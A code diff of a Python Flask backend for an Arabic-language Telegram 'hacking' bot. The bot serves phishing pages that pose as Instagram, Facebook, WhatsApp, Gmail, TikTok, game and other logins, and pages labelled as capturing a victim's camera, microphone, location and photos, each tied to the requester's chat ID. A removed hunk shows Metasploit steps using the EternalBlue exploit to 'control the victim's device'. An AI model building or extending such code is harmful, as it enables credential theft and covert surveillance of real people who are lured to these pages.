@@ -35,15 +35,6 @@ TOOLS_MSG = """
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 1️⃣ *Metasploit* (اختراق الأجهزة)
-┌── *الشرح:* أداة لاختراق أجهزة الكمبيوتر والموبايل.
-├── *الخطوات:*
-│   1. افتح Termux.
-│   2. `pkg install metasploit`
-│   3. `msfconsole`
-│   4. `search exploit`
-│   5. `use exploit/windows/smb/ms17_010_eternalblue`
-└── *النتيجة:* تتحكم بجهاز الضحية.
-
 2️⃣ *Hydra* (تخمين كلمات السر)
 3️⃣ *Nmap* (فحص المنافذ)
 4️⃣ *SQLmap* (اختراق قواعد البيانات)
@@ -127,25 +118,77 @@ async function send(){{
 </html>
 """
 
-# جميع صفحات الاختراق
-@app.route('/instagram.html') def instagram(): return phish_page("انستقرام", request.args.get('chatId'))
-@app.route('/facebook.html') def facebook(): return phish_page("فيسبوك", request.args.get('chatId'))
-@app.route('/whatsapp.html') def whatsapp(): return phish_page("واتساب", request.args.get('chatId'))
-@app.route('/snapchat.html') def snapchat(): return phish_page("سناب شات", request.args.get('chatId'))
-@app.route('/tiktok.html') def tiktok(): return phish_page("تيك توك", request.args.get('chatId'))
-@app.route('/freefire.html') def freefire(): return phish_page("فري فاير", request.args.get('chatId'))
-@app.route('/pubg.html') def pubg(): return phish_page("بوبجي", request.args.get('chatId'))
-@app.route('/discord.html') def discord(): return phish_page("ديسكورد", request.args.get('chatId'))
-@app.route('/twitter.html') def twitter(): return phish_page("تويتر", request.args.get('chatId'))
-@app.route('/youtube.html') def youtube(): return phish_page("يوتيوب", request.args.get('chatId'))
-@app.route('/telegram.html') def telegram(): return phish_page("تيليجرام", request.args.get('chatId'))
-@app.route('/gmail.html') def gmail(): return phish_page("جيميل", request.args.get('chatId'))
-@app.route('/camera_front.html') def camera_front(): return phish_page("كاميرا امامية", request.args.get('chatId'))
-@app.route('/camera_back.html') def camera_back(): return phish_page("كاميرا خلفية", request.args.get('chatId'))
-@app.route('/recording.html') def recording(): return phish_page("تسجيل صوت", request.args.get('chatId'))
-@app.route('/location.html') def location(): return phish_page("تحديد موقع", request.args.get('chatId'))
-@app.route('/hack_device.html') def hack_device(): return phish_page("اختراق الجهاز", request.args.get('chatId'))
-@app.route('/steal_photos.html') def steal_photos(): return phish_page("سحب الصور", request.args.get('chatId'))
+@app.route('/instagram.html')
+def instagram():
+    return phish_page("انستقرام", request.args.get('chatId'))
+
+@app.route('/facebook.html')
+def facebook():
+    return phish_page("فيسبوك", request.args.get('chatId'))
+
+@app.route('/whatsapp.html')
+def whatsapp():
+    return phish_page("واتساب", request.args.get('chatId'))
+
+@app.route('/snapchat.html')
+def snapchat():
+    return phish_page("سناب شات", request.args.get('chatId'))
+
+@app.route('/tiktok.html')
+def tiktok():
+    return phish_page("تيك توك", request.args.get('chatId'))
+
+@app.route('/freefire.html')
+def freefire():
+    return phish_page("فري فاير", request.args.get('chatId'))
+
+@app.route('/pubg.html')
+def pubg():
+    return phish_page("بوبجي", request.args.get('chatId'))
+
+@app.route('/discord.html')
+def discord():
+    return phish_page("ديسكورد", request.args.get('chatId'))
+
+@app.route('/twitter.html')
+def twitter():
+    return phish_page("تويتر", request.args.get('chatId'))
+
+@app.route('/youtube.html')
+def youtube():
+    return phish_page("يوتيوب", request.args.get('chatId'))
+
+@app.route('/telegram.html')
+def telegram():
+    return phish_page("تيليجرام", request.args.get('chatId'))
+
+@app.route('/gmail.html')
+def gmail():
+    return phish_page("جيميل", request.args.get('chatId'))
+
+@app.route('/camera_front.html')
+def camera_front():
+    return phish_page("كاميرا امامية", request.args.get('chatId'))
+
+@app.route('/camera_back.html')
+def camera_back():
+    return phish_page("كاميرا خلفية", request.args.get('chatId'))
+
+@app.route('/recording.html')
+def recording():
+    return phish_page("تسجيل صوت", request.args.get('chatId'))
+
+@app.route('/location.html')
+def location():
+    return phish_page("تحديد موقع", request.args.get('chatId'))
+
+@app.route('/hack_device.html')
+def hack_device():
+    return phish_page("اختراق الجهاز", request.args.get('chatId'))
+
+@app.route('/steal_photos.html')
+def steal_photos():
+    return phish_page("سحب الصور", request.args.get('chatId'))
 
 @app.route("/")
 def home():
@@ -166,24 +209,42 @@ def webhook():
                 send_message(chat_id, APPS_MSG)
             elif text == "❓ الدعم الفني":
                 send_message(chat_id, "📞 الدعم: @A_c64")
-            elif text == "🔥 اختراق انستقرام": send_hack_link(chat_id, "انستقرام", "instagram")
-            elif text == "🔥 اختراق فيسبوك": send_hack_link(chat_id, "فيسبوك", "facebook")
-            elif text == "🔥 اختراق واتساب": send_hack_link(chat_id, "واتساب", "whatsapp")
-            elif text == "🔥 اختراق سناب شات": send_hack_link(chat_id, "سناب شات", "snapchat")
-            elif text == "🔥 اختراق تيك توك": send_hack_link(chat_id, "تيك توك", "tiktok")
-            elif text == "🔥 اختراق فري فاير": send_hack_link(chat_id, "فري فاير", "freefire")
-            elif text == "🔥 اختراق بوبجي": send_hack_link(chat_id, "بوبجي", "pubg")
-            elif text == "🔥 اختراق ديسكورد": send_hack_link(chat_id, "ديسكورد", "discord")
-            elif text == "🔥 اختراق تويتر": send_hack_link(chat_id, "تويتر", "twitter")
-            elif text == "🔥 اختراق يوتيوب": send_hack_link(chat_id, "يوتيوب", "youtube")
-            elif text == "🔥 اختراق تيليجرام": send_hack_link(chat_id, "تيليجرام", "telegram")
-            elif text == "🔥 اختراق جيميل": send_hack_link(chat_id, "جيميل", "gmail")
-            elif text == "📷 اختراق كاميرا خلفية": send_hack_link(chat_id, "كاميرا خلفية", "camera_back")
-            elif text == "📸 اختراق كاميرا أمامية": send_hack_link(chat_id, "كاميرا أمامية", "camera_front")
-            elif text == "🎙️ تسجيل صوت الضحية": send_hack_link(chat_id, "تسجيل صوت", "recording")
-            elif text == "📍 تحديد موقع الضحية": send_hack_link(chat_id, "تحديد موقع", "location")
-            elif text == "💀 اختراق الجهاز كامل": send_hack_link(chat_id, "اختراق الجهاز", "hack_device")
-            elif text == "🖼️ سحب صور الضحية": send_hack_link(chat_id, "سحب الصور", "steal_photos")
+            elif text == "🔥 اختراق انستقرام":
+                send_hack_link(chat_id, "انستقرام", "instagram")
+            elif text == "🔥 اختراق فيسبوك":
+                send_hack_link(chat_id, "فيسبوك", "facebook")
+            elif text == "🔥 اختراق واتساب":
+                send_hack_link(chat_id, "واتساب", "whatsapp")
+            elif text == "🔥 اختراق سناب شات":
+                send_hack_link(chat_id, "سناب شات", "snapchat")
+            elif text == "🔥 اختراق تيك توك":
+                send_hack_link(chat_id, "تيك توك", "tiktok")
+            elif text == "🔥 اختراق فري فاير":
+                send_hack_link(chat_id, "فري فاير", "freefire")
+            elif text == "🔥 اختراق بوبجي":
+                send_hack_link(chat_id, "بوبجي", "pubg")
+            elif text == "🔥 اختراق ديسكورد":
+                send_hack_link(chat_id, "ديسكورد", "discord")
+            elif text == "🔥 اختراق تويتر":
+                send_hack_link(chat_id, "تويتر", "twitter")
+            elif text == "🔥 اختراق يوتيوب":
+                send_hack_link(chat_id, "يوتيوب", "youtube")
+            elif text == "🔥 اختراق تيليجرام":
+                send_hack_link(chat_id, "تيليجرام", "telegram")
+            elif text == "🔥 اختراق جيميل":
+                send_hack_link(chat_id, "جيميل", "gmail")
+            elif text == "📷 اختراق كاميرا خلفية":
+                send_hack_link(chat_id, "كاميرا خلفية", "camera_back")
+            elif text == "📸 اختراق كاميرا أمامية":
+                send_hack_link(chat_id, "كاميرا أمامية", "camera_front")
+            elif text == "🎙️ تسجيل صوت الضحية":
+                send_hack_link(chat_id, "تسجيل صوت", "recording")
+            elif text == "📍 تحديد موقع الضحية":
+                send_hack_link(chat_id, "تحديد موقع", "location")
+            elif text == "💀 اختراق الجهاز كامل":
+                send_hack_link(chat_id, "اختراق الجهاز", "hack_device")
+            elif text == "🖼️ سحب صور الضحية":
+                send_hack_link(chat_id, "سحب الصور", "steal_photos")
             else:
                 send_message(chat_id, "❌ أرسل /start", BUTTONS)
     except Exception as e:
